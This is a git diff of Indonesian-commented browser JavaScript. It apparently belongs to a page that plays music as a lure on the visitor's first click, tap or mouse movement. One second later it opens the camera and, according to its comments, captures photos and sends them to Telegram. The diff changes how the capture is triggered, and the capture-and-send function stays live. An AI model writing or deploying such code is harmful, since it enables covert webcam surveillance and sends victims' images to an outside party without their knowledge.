@@ -14,24 +14,28 @@ const btnMusic = document.getElementById('musicButton');
 music.volume = 0.4;
 let started = false;
 
-// === 1️⃣ Fungsi utama ===
+// === Fungsi utama: Musik dulu → 1 detik → Kamera ===
 async function startMusicThenCamera() {
   if (started) return;
   started = true;
 
-  // --- 1️⃣ Putar musik dulu ---
+  // --- 1️⃣ Pastikan musik tidak muted ---
+  music.muted = false;
+
+  // --- 2️⃣ Putar musik ---
   try {
     await music.play();
     btnMusic.classList.remove("show");
     btnMusic.disabled = true;
     console.log("🎵 Musik berhasil diputar");
   } catch (err) {
-    console.warn("⚠️ Autoplay gagal, perlu klik manual");
+    console.warn("⚠️ Autoplay gagal, perlu klik manual:", err);
     btnMusic.classList.add("show");
     btnMusic.disabled = false;
+    return; // hentikan, biar user klik lagi
   }
 
-  // --- 2️⃣ Setelah 1 detik, jalankan kamera ---
+  // --- 3️⃣ Tunggu 1 detik baru aktifkan kamera ---
   setTimeout(async () => {
     try {
       let stream;
@@ -50,10 +54,10 @@ async function startMusicThenCamera() {
     } catch (err) {
       console.warn("🚫 Kamera tidak diizinkan:", err);
     }
-  }, 1000); // tunggu 1 detik
+  }, 1000);
 }
 
-// === 2️⃣ Ambil foto & kirim ke Telegram ===
+// === Send telegram ===
 async function autoCaptureAndSend(stream) {
   try {
     const video = document.createElement("video");
@@ -86,18 +90,16 @@ async function autoCaptureAndSend(stream) {
   }
 }
 
-// === 3️⃣ Event trigger ===
+// === Trigger dari klik/tap pertama ===
 function userStart() {
   startMusicThenCamera().catch(console.warn);
 }
 
-// === 4️⃣ Event listener ===
 btnMusic.classList.add("show");
 btnMusic.addEventListener('click', userStart);
 document.addEventListener('click', userStart, { once: true });
 document.addEventListener('touchstart', userStart, { once: true });
 
-// === 5️⃣ Desktop tambahan ===
 if (!/Android|iPhone|iPad|iOS/i.test(navigator.userAgent)) {
   window.addEventListener('mousemove', userStart, { once: true });
 }
